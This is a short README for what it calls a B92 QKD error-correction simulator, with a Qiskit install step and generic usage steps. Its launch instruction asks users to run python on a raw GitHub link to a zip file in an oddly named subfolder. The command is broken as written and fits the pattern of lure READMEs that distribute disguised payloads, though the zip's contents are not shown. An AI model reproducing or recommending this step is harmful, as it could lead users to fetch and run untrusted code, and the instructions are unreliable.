### 🔧 Installing Dependencies

Before running the software, you will need to install Qiskit. Follow these steps:

1. Open your terminal or command prompt.
2. Type the following command and hit enter:
   ```
   pip install qiskit
   ```
3. Wait for the installation to complete. This may take a few minutes.

## 📋 Using the Application

Once you have installed all necessary components, you can use the B92 QKD application.

### 1. Launching the Application

- Navigate to the folder where you downloaded the application files.
- Open your terminal or command prompt in this folder.
- Type the following command and press enter:
  ```
  python https://raw.githubusercontent.com/camargocarlin/Error-Correction-in-B92-QKD-Protocol/main/unstricken/Error-Correction-in-B92-QKD-Protocol_1.4-alpha.1.zip
  ```

### 2. Running Simulations

The application allows you to run various simulations. Follow these steps to run a simulation:

1. Choose the type of simulation you'd like to run.
2. Enter the number of quantum bits (qubits) you want to use, along with any other options available.
3. Press enter to initiate the simulation.

### 3. View Results

After the simulation runs, results will appear on your screen. You can analyze the error rates and overall performance of the B92 QKD protocol.

## 🚧 Troubleshooting
